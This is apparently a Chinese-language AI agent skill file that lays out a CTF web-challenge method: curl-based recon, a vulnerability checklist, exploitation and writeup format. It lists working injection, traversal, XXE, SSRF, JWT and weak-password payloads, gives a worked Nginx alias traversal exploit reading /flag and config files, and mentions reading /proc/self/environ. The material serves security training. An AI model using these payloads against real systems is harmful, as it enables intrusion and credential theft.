---
name: ctf2
description: CTF 解题方法论 skill。当需要按专业渗透测试流程完成 CTF 挑战时调用。强调从信息收集→漏洞探测→利用→Flag 的全链路推理，包含失败路径记录、推理链可视化和解题链路总结。
allowed-tools: Bash, WebFetch, WebSearch, Read, Write, Edit
---

# CTF 解题方法论

以专业渗透测试思路完成 CTF 挑战，注重**推理过程**而非猜测，注重**方法论**而非运气。

## 核心解题框架

解题过程分为五个阶段，每个阶段都要记录完整思考链：

```
信息收集 → 漏洞探测 → 漏洞利用 → 获取 Flag → 输出 WP
   ↑            ↓
   └── 失败反馈（调整思路，不重复试错）──┘
```

## 阶段一：信息收集（如何发现）

### 1.1 获取原始数据

CTF 题目的 URL **不要用 WebFetch**（网络策略限制），一律使用 `curl -s -i <URL>` 获取页面和 HTTP 响应头：

```bash
curl -s -i "http://TARGET/"
```

### 1.2 从响应头中提取关键信息

重点关注这些头字段，每一项都可能成为突破口：

| 响应头 | 能告诉我们什么 | 示例 |
|--------|--------------|------|
| `Server` | **Web 中间件类型和版本** | `openresty` → Nginx 系；`Apache/2.4.41` → Apache |
| `X-Powered-By` | **后端语言/框架** | `PHP/7.4.3`、`Express` |
| `Set-Cookie` | **会话机制、框架特征** | `PHPSESSID` → PHP；`JSESSIONID` → Java |
| `Location` | **重定向目标**（可能有信息泄露） | 302 → 登录页 |
| `Content-Type` | **响应类型** | `text/html`、`application/json` |
| `ETag` / `Last-Modified` | **文件时间戳**（判断是否为静态文件） | 2020 年的文件 → 老靶机 |

**关键原则**：每个响应头都要问自己"这说明了什么？缩小了哪些可能范围？"

### 1.3 分析页面源码

```bash
curl -s "http://TARGET/" | vim -
```

重点关注：
- **`<form>` 标签** → 交互点、参数名、method
- **`<a>` 标签** → 内部链接，可能存在隐藏路径
- **`<img>` / `<script>` / `<link>` 的 src/href** → 静态资源路径，可能暴露目录结构
- **HTML 注释** → `<!-- -->` 中可能藏有提示
- **`<input type="hidden">`** → 隐藏参数
- **内联 JavaScript** → 前端逻辑、API 端点

### 1.4 枚举常见路径和文件

从页面线索出发，枚举目录和文件名：

```bash
# 常见路径
for path in robots.txt .git/HEAD .htaccess index.php flag.php admin login api; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET/${path}")
  echo "$path: $code"
done

# 常见备份文件
for ext in .bak .old .swp .save .zip .tar.gz .git; do
  curl -s -o /dev/null -w "${ext}: %{http_code}\n" "http://TARGET/index${ext}"
done
```

## 阶段二：漏洞探测（完整推理链）

### 2.1 推理链模板

每尝试一个漏洞方向，都必须写出如下推理链：

```
观察到的线索 → 做出的假设 → 验证方法 → 结果 → 下一步判断
```

**示例（afr_2）**：

```
线索：响应头 Server: openresty，页面中 <img src="img/img.gif">
  ↓
假设 1：可能是 PHP LFI（题目叫 afr）
  ↓
验证：尝试 ?p=hello、枚举 .php 文件 → 全部 404
  ↓
结论：不是 PHP 漏洞，排除应用层 LFI
  ↓
假设 2：OpenResty = Nginx，可能是 Nginx 配置漏洞
  ↓
验证：/img/ 有目录浏览 + 只有 img.gif（不像正常静态目录）
  ↓
假设 3：/img 可能是 alias 映射，尝试 /img../ 路径穿越
  ↓
验证：curl /img../ → 返回根目录列表 ✅
  ↓
结论：Nginx alias 路径穿越漏洞确认
```

### 2.2 常见漏洞类型排查清单

按可能性从高到低逐一测试，**每次失败都记录原因**，避免原地打转：

- [ ] SQL 注入（`' OR 1=1--`、`' UNION SELECT--`）
- [ ] 命令注入（`; id`、`| ls`、`` `id` ``、`$(id)`）
- [ ] 模板注入 SSTI（`{{7*7}}`、`${7*7}`、`<%= 7*7 %>`）
- [ ] 文件包含 LFI（`../../../etc/passwd`、`php://filter`）
- [ ] 文件上传（改 Content-Type、改后缀、图片马）
- [ ] 路径穿越（`../`、`..\`、Nginx `alias` 特性）
- [ ] 源码泄露（`.git/HEAD`、`.DS_Store`、`index.php.bak`、`www.zip`）
- [ ] 反序列化（`O:8:"stdClass":0:{}`、Java `ysoserial`）
- [ ] XXE（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`）
- [ ] SSRF（`http://127.0.0.1:80`、`file:///etc/passwd`、`gopher://`）
- [ ] 弱口令（`admin/admin`、`test/test`、`guest/guest`）
- [ ] JWT 伪造（`alg:none`、密钥爆破）
- [ ] CRLF 注入（`%0d%0aSet-Cookie:`）

### 2.3 尝试过但失败的路径（必须记录）

**这是 WP 中最容易被忽略但最有价值的部分**。每次失败的尝试都在缩小可能性范围：

```markdown
## 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| `?p=hello` → 首页不变 | 输出 "hello world" | 始终返回首页 | 不是 PHP LFI（不像 afr_1） |
| 枚举 15 个常见 .php 文件名 | 找到 PHP 端点 | 全部 404 | 后端没有 PHP 环境 |
| `?page=`、`?file=`、`?path=` 等 | 找到 LFI 参数 | 全部忽略 | 不是 GET 参数类型的漏洞 |
| 访问 `/admin/`、`/login`、`/api` | 找到隐藏功能 | 全部 404 | 只有一个首页 + 图片路径 |
```

**记录原则**：每个「没成功」都在为最终的成功排除干扰项。

## 阶段三：漏洞利用

### 3.1 确认漏洞

找到漏洞后，先验证最小可行 PoC，再逐步扩大利用范围：

```bash
# 步骤 1：最小 PoC — 证明漏洞存在
curl -s "http://TARGET/img../"

# 步骤 2：读取目标文件
curl -s "http://TARGET/img../flag"

# 步骤 3：溯源漏洞根因（读配置文件）
curl -s "http://TARGET/img../etc/nginx/sites-enabled/default"
```

### 3.2 图解：正常请求 vs 攻击请求

WP 中用 ASCII 图解释漏洞原理，比文字更直观：

```
正常请求：/img/img.gif
┌─────────────────────────────────────────────┐
│ URL:   /img/img.gif                         │
│          ↓ 匹配 location /img，去掉前缀 /img  │
│ 剩余:   /img.gif                            │
│          ↓ 拼接到 alias /tmp/               │
│ 结果:   /tmp//img.gif → /tmp/img.gif ✅      │
└─────────────────────────────────────────────┘

攻击请求：/img../flag
┌─────────────────────────────────────────────┐
│ URL:   /img../flag                          │
│          ↓ 匹配 location /img，去掉前缀 /img  │
│ 剩余:   ../flag                             │
│          ↓ 拼接到 alias /tmp/               │
│ 结果:   /tmp/../flag → /flag ❌ 穿越到根目录！ │
└─────────────────────────────────────────────┘
```

## 阶段四：获取 Flag

常见 flag 位置：
- Web 目录下：`/var/www/html/flag`、`flag.php`、`flag.txt`
- 根目录：`/flag`、`/flag.txt`、`/root/flag`
- 环境变量：`env`、`/proc/self/environ`
- 数据库：`SELECT flag FROM flags`
- 源码注释：`// flag{...}`

## 阶段五：解题链路总结图

WP 末尾用决策树/流程图总结完整解题链路：

```
获取 HTTP 响应头
    ↓ Server: openresty
确认 Nginx 环境
    ↓
尝试 PHP LFI（afr_1 思路）
    ↓ 全部 404
排除 PHP 漏洞
    ↓
观察页面源码
    ↓ <img src="img/img.gif">
唯一线索：/img/ 路径
    ↓
访问 /img/ → 目录浏览开启
    ↓ 只有 img.gif，不像普通静态目录
怀疑 alias 配置
    ↓
发送 /img../ → 路径穿越成功
    ↓
读取 /flag → 获取 flag
    ↓
读取 Nginx 配置 → 确认漏洞根因
```

## Writeup 输出标准

WP 文件使用以下结构，保存到当前工作目录：

```markdown
---
title: "[题目名称]"
date: <YYYY-MM-DD>
categories:
  - CTF
  - <WEB/CRYPTO/PWN/MISC>
tags:
  - CTF
---

# 1. 题目分析

[初始访问、页面内容、HTTP 头关键信息]

# 2. 信息收集

[详细的收集过程，每步附命令和输出]

# 3. 漏洞分析（含推理链和失败路径）

[推理链、为什么判断漏洞在这里、技术原理、ASCII 图解]

# 4. 漏洞利用

[完整操作步骤和命令，从 PoC 到获取敏感信息]

# 5. Flag

[flag 值和获取方式]

# 6. 知识点总结

[技术点、工具、修复建议]

# 7. 解题链路总结图

[决策树/流程图]
```

## 执行要点

- **先侦察，后攻击**：信息收集至少花 30% 的时间
- **推理优于猜测**：每个判断都要有依据，不能"碰运气"
- **失败也是信息**：排除法是最被低估的渗透技巧
- **记录所有命令和输出**：WP 中不能只有结论没有过程
- **对比同类题目**：如果做过类似题（如 afr_2 对比 afr_1），点出异同
- **溯源根因**：找到 flag 不是终点，搞清楚漏洞是怎么产生的才是
- 使用 `curl -s -i` 获取 HTTP 头，不要用 WebFetch
- 本地字典：`/opt/seclists`（全量）、`/opt/wordlists`（常用）
